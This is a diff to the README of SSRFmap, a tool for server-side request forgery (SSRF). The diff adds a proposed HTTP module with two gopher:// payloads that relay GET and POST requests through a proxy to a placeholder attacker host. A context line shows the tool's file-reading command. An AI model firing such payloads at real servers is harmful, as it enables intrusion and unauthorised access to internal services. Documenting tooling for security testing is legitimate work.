@@ -120,6 +120,11 @@ python ssrfmap.py -r data/request.txt -p url -m readfiles
 
 I :heart: pull requests :)
 Feel free to add any feature listed below or a new service.
+  - HTTP module (Jenkins ?)
+  ```powershell
+  gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
+  gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
+  ```
 
 The following code is a template if you wish to add a module interacting with a service.
 
